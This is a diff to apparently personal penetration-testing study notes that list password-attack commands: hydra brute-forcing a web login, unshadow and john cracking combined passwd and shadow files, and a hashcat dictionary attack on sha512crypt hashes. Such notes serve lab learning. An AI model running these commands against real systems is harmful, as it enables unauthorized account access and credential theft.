@@ -49,7 +49,8 @@ Hey Hai, This is just a walkthrough and kinda recap of what in learnt during my 
 - hydra crackme.site http-post-form "/login.php:usr=^USER^&pwd=^PASS^:invalid Credentials" -L  /usr/share/username.lst -P /usr/share/pass.lst -f -V
 - unshadow passwd shadow > hashestocrack
 - john hashestocrack     ->password      (username)
-- 
+- /etc/login.defs  -> to check hashin used for passwords
+- hashcat -m 1800 -a 0 admin.hash /root/Desktop/wordlists/1000000-password-seclists.txt
 ### The Black Box Walkthrough's : Box 1
 
 #### Machine 1
